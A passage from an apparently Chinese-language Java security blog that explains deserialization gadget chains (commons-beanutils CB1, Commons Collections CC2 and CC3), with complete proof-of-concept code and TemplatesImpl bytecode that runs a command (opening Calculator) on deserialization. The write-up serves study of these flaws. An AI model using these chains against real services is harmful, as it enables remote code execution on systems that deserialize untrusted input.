,109 ,108 ,47 ,105 ,110 , 116 ,101 ,114 ,110 ,97 ,108 ,47 ,115 ,101 ,114 ,105 ,97 ,108 ,105 ,122 , 101 ,114 ,47 ,83 ,101 ,114 ,105 ,97 ,108 ,105 ,122 ,97 ,116 ,105 ,111 , 110 ,72 ,97 ,110 ,100 ,108 ,101 ,114 ,59 ,41 ,86 ,1 ,0 ,6 ,60 , 105 ,110 ,105 ,116 ,62 ,1 ,0 ,3 ,40 ,41 ,86 ,7 ,0 ,35 ,1 , 0 ,10 ,83 ,111 ,117 ,114 ,99 ,101 ,70 ,105 ,108 ,101 ,1 ,0 ,23 , 72 ,101 ,108 ,108 ,111 ,84 ,101 ,109 ,112 ,108 ,97 ,116 ,101 ,115 ,73 , 109 ,112 ,108 ,46 ,106 ,97 ,118 ,97 ,12 ,0 ,17 ,0 ,18 ,7 ,0 , 36 ,12 ,0 ,37 ,0 ,38 ,1 ,0 ,40 ,111 ,112 ,101 ,110 ,32 ,47 , 83 ,121 ,115 ,116 ,101 ,109 ,47 ,65 ,112 ,112 ,108 ,105 ,99 ,97 ,116 , 105 ,111 ,110 ,115 ,47 ,67 ,97 ,108 ,99 ,117 ,108 ,97 ,116 ,111 ,114 , 46 ,97 ,112 ,112 ,12 ,0 ,39 ,0 ,40 ,7 ,0 ,41 ,12 ,0 ,42 , 0 ,43 ,1 ,0 ,19 ,72 ,101 ,108 ,108 ,111 ,32 ,84 ,101 ,109 ,112 , 108 ,97 ,116 ,101 ,115 ,73 ,109 ,112 ,108 ,7 ,0 ,44 ,12 ,0 ,45 , 0 ,46 ,1 ,0 ,28 ,121 ,115 ,111 ,115 ,101 ,114 ,105 ,97 ,108 ,47 , 72 ,101 ,108 ,108 ,111 ,84 ,101 ,109 ,112 ,108 ,97 ,116 ,101 ,115 ,73 , 109 ,112 ,108 ,1 ,0 ,64 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 , 114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,97 ,108 ,97 ,110 , 47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,120 ,115 ,108 ,116 ,99 , 47 ,114 ,117 ,110 ,116 ,105 ,109 ,101 ,47 ,65 ,98 ,115 ,116 ,114 ,97 , 99 ,116 ,84 ,114 ,97 ,110 ,115 ,108 ,101 ,116 ,1 ,0 ,57 ,99 ,111 , 109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 , 101 ,47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 , 108 ,47 ,120 ,115 ,108 ,116 ,99 ,47 ,84 ,114 ,97 ,110 ,115 ,108 ,101 , 116 ,69 ,120 ,99 ,101 ,112 ,116 ,105 ,111 ,110 ,1 ,0 ,19 ,106 ,97 , 118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,69 ,120 ,99 ,101 ,112 ,116 ,105 , 111 ,110 ,1 ,0 ,17 ,106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 , 82 ,117 ,110 ,116 ,105 ,109 ,101 ,1 ,0 ,10 ,103 ,101 ,116 ,82 ,117 , 110 ,116 ,105 ,109 ,101 ,1 ,0 ,21 ,40 ,41 ,76 ,106 ,97 ,118 ,97 , 47 ,108 ,97 ,110 ,103 ,47 ,82 ,117 ,110 ,116 ,105 ,109 ,101 ,59 ,1 , 0 ,4 ,101 ,120 ,101 ,99 ,1 ,0 ,39 ,40 ,76 ,106 ,97 ,118 ,97 , 47 ,108 ,97 ,110 ,103 ,47 ,83 ,116 ,114 ,105 ,110 ,103 ,59 ,41 ,76 , 106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,80 ,114 ,111 ,99 ,101 , 115 ,115 ,59 ,1 ,0 ,16 ,106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 , 47 ,83 ,121 ,115 ,116 ,101 ,109 ,1 ,0 ,3 ,111 ,117 ,116 ,1 ,0 , 21 ,76 ,106 ,97 ,118 ,97 ,47 ,105 ,111 ,47 ,80 ,114 ,105 ,110 ,116 , 83 ,116 ,114 ,101 ,97 ,109 ,59 ,1 ,0 ,19 ,106 ,97 ,118 ,97 ,47 , 105 ,111 ,47 ,80 ,114 ,105 ,110 ,116 ,83 ,116 ,114 ,101 ,97 ,109 ,1 , 0 ,7 ,112 ,114 ,105 ,110 ,116 ,108 ,110 ,1 ,0 ,21 ,40 ,76 ,106 , 97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,83 ,116 ,114 ,105 ,110 ,103 , 59 ,41 ,86 ,0 ,33 ,0 ,8 ,0 ,9 ,0 ,0 ,0 ,0 ,0 ,3 , 0 ,1 ,0 ,10 ,0 ,11 ,0 ,2 ,0 ,12 ,0 ,0 ,0 ,25 ,0 , 0 ,0 ,3 ,0 ,0 ,0 ,1 ,-79 ,0 ,0 ,0 ,1 ,0 ,13 ,0 , 0 ,0 ,6 ,0 ,1 ,0 ,0 ,0 ,14 ,0 ,14 ,0 ,0 ,0 ,4 , 0 ,1 ,0 ,15 ,0 ,1 ,0 ,10 ,0 ,16 ,0 ,2 ,0 ,12 ,0 , 0 ,0 ,25 ,0 ,0 ,0 ,4 ,0 ,0 ,0 ,1 ,-79 ,0 ,0 ,0 , 1 ,0 ,13 ,0 ,0 ,0 ,6 ,0 ,1 ,0 ,0 ,0 ,16 ,0 ,14 , 0 ,0 ,0 ,4 ,0 ,1 ,0 ,15 ,0 ,1 ,0 ,17 ,0 ,18 ,0 , 2 ,0 ,12 ,0 ,0 ,0 ,58 ,0 ,2 ,0 ,2 ,0 ,0 ,0 ,22 , 42 ,-73 ,0 ,1 ,-72 ,0 ,2 ,18 ,3 ,-74 ,0 ,4 ,76 ,-78 ,0 , 5 ,18 ,6 ,-74 ,0 ,7 ,-79 ,0 ,0 ,0 ,1 ,0 ,13 ,0 ,0 , 0 ,18 ,0 ,4 ,0 ,0 ,0 ,18 ,0 ,4 ,0 ,19 ,0 ,13 ,0 , 20 ,0 ,21 ,0 ,21 ,0 ,14 ,0 ,0 ,0 ,4 ,0 ,1 ,0 ,19 , 0 ,1 ,0 ,20 ,0 ,0 ,0 ,2 ,0 ,21 ,&#125;; TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;testClassBytes&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl()); obj.newTransformer(); &#125;&#125; 其中HelloTemplatesImpl代码为： 1234567891011121314151617181920import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.IOException;public classHelloTemplatesImpl extends AbstractTranslet &#123; public void transform(DOM document, SerializationHandler[] handlers)throws TransletException &#123;&#125; public void transform(DOM document, DTMAxisIterator iterator,SerializationHandler handler) throws TransletException &#123;&#125; public HelloTemplatesImpl() throws Exception &#123; super(); Process p = Runtime.getRuntime().exec(&quot;open /System/Applications/Calculator.app&quot;); System.out.println(&quot;Hello TemplatesImpl&quot;); &#125;&#125; 其getOutputProperties调用了newTransformer，进而导致字节码被执行。(入口2) 123456defineClass:185, TemplatesImpl$TransletClassLoader (com.sun.org.apache.xalan.internal.xsltc.trax)defineTransletClasses:414, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)getTransletInstance:451, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)main:101, Test_commons_beanutils (ysoserial) 测试代码 1obj.getOutputProperties();//下断点 又因为getOutputProperties符合javabeen的小驼峰式命名法规则，并且返回类型不是void，所以我们可以通过PropertyUtils.getProperty进行调用。代码如下。 1PropertyUtils.getProperty(obj,&quot;OutputProperties&quot;); BeanComparatorBeanComparator位于org.apache.commons.beanutils包内，其compare会调用PropertyUtils.getProperty，这就和上面的命令执行连接起来了，我们做个简单测试。其构造函数 123456789public BeanComparator(String property, Comparator&lt;?&gt; comparator) &#123; this.setProperty(property); if (comparator != null) &#123; this.comparator = comparator; &#125; else &#123; this.comparator = ComparableComparator.getInstance(); &#125; &#125; 其compare方法 1234567891011121314151617public int compare(T o1, T o2) &#123; if (this.property == null) &#123; return this.internalCompare(o1, o2); &#125; else &#123; try &#123; Object value1 = PropertyUtils.getProperty(o1, this.property); Object value2 = PropertyUtils.getProperty(o2, this.property); return this.internalCompare(value1, value2); &#125; catch (IllegalAccessException var5) &#123; throw new RuntimeException(&quot;IllegalAccessException: &quot; + var5.toString()); &#125; catch (InvocationTargetException var6) &#123; throw new RuntimeException(&quot;InvocationTargetException: &quot; + var6.toString()); &#125; catch (NoSuchMethodException var7) &#123; throw new RuntimeException(&quot;NoSuchMethodException: &quot; + var7.toString()); &#125; &#125; &#125; 我们学习了CC4的基础知识，假设compare(T o1, T o2)两个参数是PriorityQueue传过来的，那么在PriorityQueue中 123456789101112131415161718192021queue[i] = s.readObject();//PriorityQueue.readObjectheapify();//调用点,PriorityQueue.readObject//siftDownUsingComparator又调用了，集合的compare方法。private void siftDownUsingComparator(int k, E x) &#123; int half = size &gt;&gt;&gt; 1; while (k &lt; half) &#123; int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0)//双参数传入compare c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; &#125; queue[k] = x; &#125; 我们先看利用代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import org.apache.commons.beanutils.*;import org.apache.commons.beanutils.BeanComparator;import java.io.ByteArrayInputStream;import java.io.ByteArrayOutputStream;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.util.PriorityQueue;import static ysoserial.payloads.util.Reflections.setFieldValue;/** * author: f19t * Date: 2023/2/27 14:20 */public class Test_commons_beanutils &#123; public static void main(String[] args) throws Exception &#123; byte[] testClassBytes = new byte[]&#123;-54 ,-2 ,-70 ,-66 ,0 ,0 ,0 ,52 ,0 ,47 ,10 ,0 ,9 ,0 ,22 , 10 ,0 ,23 ,0 ,24 ,8 ,0 ,25 ,10 ,0 ,23 ,0 ,26 ,9 ,0 , 27 ,0 ,28 ,8 ,0 ,29 ,10 ,0 ,30 ,0 ,31 ,7 ,0 ,32 ,7 , 0 ,33 ,1 ,0 ,9 ,116 ,114 ,97 ,110 ,115 ,102 ,111 ,114 ,109 ,1 , 0 ,114 ,40 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 , 47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 , 110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,120 ,115 ,108 ,116 ,99 ,47 ,68 , 79 ,77 ,59 ,91 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 , 103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,109 ,108 ,47 ,105 ,110 , 116 ,101 ,114 ,110 ,97 ,108 ,47 ,115 ,101 ,114 ,105 ,97 ,108 ,105 ,122 , 101 ,114 ,47 ,83 ,101 ,114 ,105 ,97 ,108 ,105 ,122 ,97 ,116 ,105 ,111 , 110 ,72 ,97 ,110 ,100 ,108 ,101 ,114 ,59 ,41 ,86 ,1 ,0 ,4 ,67 , 111 ,100 ,101 ,1 ,0 ,15 ,76 ,105 ,110 ,101 ,78 ,117 ,109 ,98 ,101 , 114 ,84 ,97 ,98 ,108 ,101 ,1 ,0 ,10 ,69 ,120 ,99 ,101 ,112 ,116 , 105 ,111 ,110 ,115 ,7 ,0 ,34 ,1 ,0 ,-90 ,40 ,76 ,99 ,111 ,109 , 47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 , 47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 , 47 ,120 ,115 ,108 ,116 ,99 ,47 ,68 ,79 ,77 ,59 ,76 ,99 ,111 ,109 , 47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 , 47 ,120 ,109 ,108 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,100 , 116 ,109 ,47 ,68 ,84 ,77 ,65 ,120 ,105 ,115 ,73 ,116 ,101 ,114 ,97 , 116 ,111 ,114 ,59 ,76 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 , 103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,109 ,108 ,47 ,105 ,110 , 116 ,101 ,114 ,110 ,97 ,108 ,47 ,115 ,101 ,114 ,105 ,97 ,108 ,105 ,122 , 101 ,114 ,47 ,83 ,101 ,114 ,105 ,97 ,108 ,105 ,122 ,97 ,116 ,105 ,111 , 110 ,72 ,97 ,110 ,100 ,108 ,101 ,114 ,59 ,41 ,86 ,1 ,0 ,6 ,60 , 105 ,110 ,105 ,116 ,62 ,1 ,0 ,3 ,40 ,41 ,86 ,7 ,0 ,35 ,1 , 0 ,10 ,83 ,111 ,117 ,114 ,99 ,101 ,70 ,105 ,108 ,101 ,1 ,0 ,23 , 72 ,101 ,108 ,108 ,111 ,84 ,101 ,109 ,112 ,108 ,97 ,116 ,101 ,115 ,73 , 109 ,112 ,108 ,46 ,106 ,97 ,118 ,97 ,12 ,0 ,17 ,0 ,18 ,7 ,0 , 36 ,12 ,0 ,37 ,0 ,38 ,1 ,0 ,40 ,111 ,112 ,101 ,110 ,32 ,47 , 83 ,121 ,115 ,116 ,101 ,109 ,47 ,65 ,112 ,112 ,108 ,105 ,99 ,97 ,116 , 105 ,111 ,110 ,115 ,47 ,67 ,97 ,108 ,99 ,117 ,108 ,97 ,116 ,111 ,114 , 46 ,97 ,112 ,112 ,12 ,0 ,39 ,0 ,40 ,7 ,0 ,41 ,12 ,0 ,42 , 0 ,43 ,1 ,0 ,19 ,72 ,101 ,108 ,108 ,111 ,32 ,84 ,101 ,109 ,112 , 108 ,97 ,116 ,101 ,115 ,73 ,109 ,112 ,108 ,7 ,0 ,44 ,12 ,0 ,45 , 0 ,46 ,1 ,0 ,28 ,121 ,115 ,111 ,115 ,101 ,114 ,105 ,97 ,108 ,47 , 72 ,101 ,108 ,108 ,111 ,84 ,101 ,109 ,112 ,108 ,97 ,116 ,101 ,115 ,73 , 109 ,112 ,108 ,1 ,0 ,64 ,99 ,111 ,109 ,47 ,115 ,117 ,110 ,47 ,111 , 114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 ,101 ,47 ,120 ,97 ,108 ,97 ,110 , 47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 ,108 ,47 ,120 ,115 ,108 ,116 ,99 , 47 ,114 ,117 ,110 ,116 ,105 ,109 ,101 ,47 ,65 ,98 ,115 ,116 ,114 ,97 , 99 ,116 ,84 ,114 ,97 ,110 ,115 ,108 ,101 ,116 ,1 ,0 ,57 ,99 ,111 , 109 ,47 ,115 ,117 ,110 ,47 ,111 ,114 ,103 ,47 ,97 ,112 ,97 ,99 ,104 , 101 ,47 ,120 ,97 ,108 ,97 ,110 ,47 ,105 ,110 ,116 ,101 ,114 ,110 ,97 , 108 ,47 ,120 ,115 ,108 ,116 ,99 ,47 ,84 ,114 ,97 ,110 ,115 ,108 ,101 , 116 ,69 ,120 ,99 ,101 ,112 ,116 ,105 ,111 ,110 ,1 ,0 ,19 ,106 ,97 , 118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,69 ,120 ,99 ,101 ,112 ,116 ,105 , 111 ,110 ,1 ,0 ,17 ,106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 , 82 ,117 ,110 ,116 ,105 ,109 ,101 ,1 ,0 ,10 ,103 ,101 ,116 ,82 ,117 , 110 ,116 ,105 ,109 ,101 ,1 ,0 ,21 ,40 ,41 ,76 ,106 ,97 ,118 ,97 , 47 ,108 ,97 ,110 ,103 ,47 ,82 ,117 ,110 ,116 ,105 ,109 ,101 ,59 ,1 , 0 ,4 ,101 ,120 ,101 ,99 ,1 ,0 ,39 ,40 ,76 ,106 ,97 ,118 ,97 , 47 ,108 ,97 ,110 ,103 ,47 ,83 ,116 ,114 ,105 ,110 ,103 ,59 ,41 ,76 , 106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,80 ,114 ,111 ,99 ,101 , 115 ,115 ,59 ,1 ,0 ,16 ,106 ,97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 , 47 ,83 ,121 ,115 ,116 ,101 ,109 ,1 ,0 ,3 ,111 ,117 ,116 ,1 ,0 , 21 ,76 ,106 ,97 ,118 ,97 ,47 ,105 ,111 ,47 ,80 ,114 ,105 ,110 ,116 , 83 ,116 ,114 ,101 ,97 ,109 ,59 ,1 ,0 ,19 ,106 ,97 ,118 ,97 ,47 , 105 ,111 ,47 ,80 ,114 ,105 ,110 ,116 ,83 ,116 ,114 ,101 ,97 ,109 ,1 , 0 ,7 ,112 ,114 ,105 ,110 ,116 ,108 ,110 ,1 ,0 ,21 ,40 ,76 ,106 , 97 ,118 ,97 ,47 ,108 ,97 ,110 ,103 ,47 ,83 ,116 ,114 ,105 ,110 ,103 , 59 ,41 ,86 ,0 ,33 ,0 ,8 ,0 ,9 ,0 ,0 ,0 ,0 ,0 ,3 , 0 ,1 ,0 ,10 ,0 ,11 ,0 ,2 ,0 ,12 ,0 ,0 ,0 ,25 ,0 , 0 ,0 ,3 ,0 ,0 ,0 ,1 ,-79 ,0 ,0 ,0 ,1 ,0 ,13 ,0 , 0 ,0 ,6 ,0 ,1 ,0 ,0 ,0 ,14 ,0 ,14 ,0 ,0 ,0 ,4 , 0 ,1 ,0 ,15 ,0 ,1 ,0 ,10 ,0 ,16 ,0 ,2 ,0 ,12 ,0 , 0 ,0 ,25 ,0 ,0 ,0 ,4 ,0 ,0 ,0 ,1 ,-79 ,0 ,0 ,0 , 1 ,0 ,13 ,0 ,0 ,0 ,6 ,0 ,1 ,0 ,0 ,0 ,16 ,0 ,14 , 0 ,0 ,0 ,4 ,0 ,1 ,0 ,15 ,0 ,1 ,0 ,17 ,0 ,18 ,0 , 2 ,0 ,12 ,0 ,0 ,0 ,58 ,0 ,2 ,0 ,2 ,0 ,0 ,0 ,22 , 42 ,-73 ,0 ,1 ,-72 ,0 ,2 ,18 ,3 ,-74 ,0 ,4 ,76 ,-78 ,0 , 5 ,18 ,6 ,-74 ,0 ,7 ,-79 ,0 ,0 ,0 ,1 ,0 ,13 ,0 ,0 , 0 ,18 ,0 ,4 ,0 ,0 ,0 ,18 ,0 ,4 ,0 ,19 ,0 ,13 ,0 , 20 ,0 ,21 ,0 ,21 ,0 ,14 ,0 ,0 ,0 ,4 ,0 ,1 ,0 ,19 , 0 ,1 ,0 ,20 ,0 ,0 ,0 ,2 ,0 ,21 ,&#125;; TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, &quot;_bytecodes&quot;, new byte[][]&#123;testClassBytes&#125;); setFieldValue(obj, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;); setFieldValue(obj, &quot;_tfactory&quot;, new TransformerFactoryImpl());// PropertyUtils.getProperty(obj,&quot;getOutputProperties&quot;);// obj.getOutputProperties(); BeanComparator beanComparator = new BeanComparator();//为空，否则add时会调用getter方法。 final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(3, beanComparator); queue.add(1); queue.add(1); setFieldValue(beanComparator, &quot;property&quot;, &quot;outputProperties&quot;);//替换为执行字节码的getter setFieldValue(queue,&quot;queue&quot;,new Object[]&#123;obj,1&#125;);//必须，不替换queue为数字，无法调用outputProperties ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); &#125;&#125; 无依赖CB1链因为BeanComparator的构造函数说明，如果没有指定Comparator，那么默认使用ComparableComparator.getInstance()。 12345678910111213public BeanComparator(String property) &#123; this(property, ComparableComparator.getInstance()); &#125; public BeanComparator(String property, Comparator&lt;?&gt; comparator) &#123; this.setProperty(property); if (comparator != null) &#123; this.comparator = comparator; &#125; else &#123; this.comparator = ComparableComparator.getInstance(); &#125; &#125; 所有构造无依赖CC的CB1链只需要在构造BeanComparator指定一个java自带的Comparator即可。","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"}]},{"title":"CC4基础知识","slug":"CC4基础知识","date":"2023-02-26T14:05:27.000Z","updated":"2023-02-26T14:06:11.955Z","comments":true,"path":"2023/02/26/CC4基础知识/","link":"","permalink":"https://f19t.github.io.git/2023/02/26/CC4%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"CC4基础知识简单整理一下CC4利用链用到的基础知识。","text":"CC4基础知识简单整理一下CC4利用链用到的基础知识。 ComparatorComparator是一个接口，用来实现集合中元素的比较、排序. 1public interface Comparator&lt;T&gt; &#123;&#125; PriorityQueuePriorityQueue是java自带的的一种数据结构，其自带readObject方法，调用了 heapify() 。 12345678910111213141516171819private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; // Read in all elements. for (int i = 0; i &lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in &quot;proper order&quot;, but the // spec has never explained what that might be. heapify();//调用点&#125; 其heapify()中有调用了 siftDown 方法。 1234private void heapify() &#123; for (int i = (size &gt;&gt;&gt; 1) - 1; i &gt;= 0; i--) siftDown(i, (E) queue[i]); &#125; 当被比较集合不为空时，其siftDown又调用了siftDownUsingComparator方法。 123456private void siftDown(int k, E x) &#123; if (comparator != null) siftDownUsingComparator(k, x); else siftDownComparable(k, x); &#125; siftDownUsingComparator又调用了，集合的compare方法。 12345678910111213141516private void siftDownUsingComparator(int k, E x) &#123; int half = size &gt;&gt;&gt; 1; while (k &lt; half) &#123; int child = (k &lt;&lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right &lt; size &amp;&amp; comparator.compare((E) c, (E) queue[right]) &gt; 0) c = queue[child = right]; if (comparator.compare(x, (E) c) &lt;= 0) break; queue[k] = c; k = child; &#125; queue[k] = x; &#125; 其构造函数的参数为int和实现Comparator接口的的对象。 123456789public PriorityQueue(int initialCapacity, Comparator&lt;? super E&gt; comparator) &#123; // Note: This restriction of at least one is not actually needed, // but continues for 1.5 compatibility if (initialCapacity &lt; 1) throw new IllegalArgumentException(); this.queue = new Object[initialCapacity]; this.comparator = comparator; &#125; TransformingComparatorTransformingComparator是实现Comparator接口的类。 1public class TransformingComparator&lt;I, O&gt; implements Comparator&lt;I&gt;, Serializable &#123; 其构造函数接收接口Transformer的对象。 123public TransformingComparator(Transformer&lt;? super I, ? extends O&gt; transformer) &#123; this(transformer, ComparatorUtils.NATURAL_COMPARATOR); &#125; 其compare方法，实现了对transform的调用。 12345public int compare(I obj1, I obj2) &#123; O value1 = this.transformer.transform(obj1); O value2 = this.transformer.transform(obj2); return this.decorated.compare(value1, value2); &#125; 有了上述CC4的基础知识，我们就可以构造出CC2这条链。 注意: 一开始放的的假的命令执行transformer是必须的，因为PriorityQueue的add方法会调用offer，offer又会调用siftUp方法，siftUp又会调用siftUpUsingComparator，siftUpUsingComparator又会调用comparator.compare，导致命令提前执行，并报错。 1234567891011121314151617181920212223242526272829303132333435363738import java.io.*;import java.util.PriorityQueue;import org.apache.commons.collections4.Transformer;import org.apache.commons.collections4.functors.ChainedTransformer;import org.apache.commons.collections4.functors.ConstantTransformer;import org.apache.commons.collections4.functors.InvokerTransformer;import org.apache.commons.collections4.comparators.TransformingComparator;import static ysoserial.payloads.util.Reflections.setFieldValue;/** * author: f19t * Date: 2023/2/26 21:21 */public class Test_PriorityQueue &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; //定义一个命令执行的transformers数组 new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), //null相当于空数组 new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;open /System/Applications/Calculator.app&quot;&#125;)&#125;; Transformer[] transformer = new Transformer[] &#123;new ConstantTransformer(1)&#125;; Transformer transformerchain = new ChainedTransformer(transformer); TransformingComparator comparator = new TransformingComparator(transformerchain); PriorityQueue queue = new PriorityQueue(4, comparator); queue.add(1); queue.add(2); setFieldValue(transformerchain, &quot;iTransformers&quot;, transformers);//需要替换为正确的 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); &#125;&#125;","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"https://f19t.github.io.git/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVASEC","slug":"JAVASEC","permalink":"https://f19t.github.io.git/tags/JAVASEC/"}]},{"title":"CC3基础知识","slug":"CC3基础知识","date":"2023-02-25T11:45:30.000Z","updated":"2023-02-25T11:59:01.570Z","comments":true,"path":"2023/02/25/CC3基础知识/","link":"","permalink":"https://f19t.github.io.git/2023/02/25/CC3%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/","excerpt":"CC3基础知识简单总结一下cc3用到的基础知识。","text":"CC3基础知识简单总结一下cc3用到的基础知识。 TransformerTransformer是一个接口，其transform，是一个待实现的方法。 123public interface Transformer &#123; Object transform(Object var1);&#125; InvokerTransformerInvokerTransformer是实现了Transformer接口的具体类，其transform方法是通过反射去执行方法。 12345public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123; this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; &#125; 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; else &#123; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); &#125; catch (NoSuchMethodException var5) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException var6) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException var7) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + this.iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, var7); &#125; &#125; &#125; 测试代码，执行以下代码可弹计算机。 1234567891011121314import org.apache.commons.collections.functors.InvokerTransformer;/** * author: f19t * Date: 2023/2/25 16:19 */public class Test_InvokerTransformer &#123; public static void main(String[] args) &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;new String(&quot;open /System/Applications/Calculator.app&quot;)&#125;); invokerTransformer.transform(java.lang.Runtime.getRuntime()); &#125;&#125; ConstantTransformerConstantTransformer是实现了Transformer接口的具体类，其transform方法是返回输入的对象。 1234567public ConstantTransformer(Object constantToReturn) &#123; this.iConstant = constantToReturn; &#125; public Object transform(Object input) &#123; return this.iConstant; &#125; 因为ConstantTransformer构造函数参数可控，所以我们可以通过transform获取我们的对象。 123456789101112131415import org.apache.commons.collections.functors.ConstantTransformer;/** * author: f19t * Date: 2023/2/25 16:29 */public class Test_ConstantTransformer &#123; public static void main(String[] args) &#123; String s = new String(&quot;1&quot;); ConstantTransformer constantTransformer = new ConstantTransformer(s); String a = (String) constantTransformer.transform(null); System.out.println(s.equals(a)); &#125;&#125; 1true ChainedTransformerChainedTransformer是实现了Transformer接口的具体类，其Transform方法是依次按顺序调用transform数组内的Transform变量的transform方法。 1234567891011public ChainedTransformer(Transformer[] transformers) &#123; this.iTransformers = transformers; &#125; public Object transform(Object object) &#123; for(int i = 0; i &lt; this.iTransformers.length; ++i) &#123; object = this.iTransformers[i].transform(object); &#125; return object; &#125; 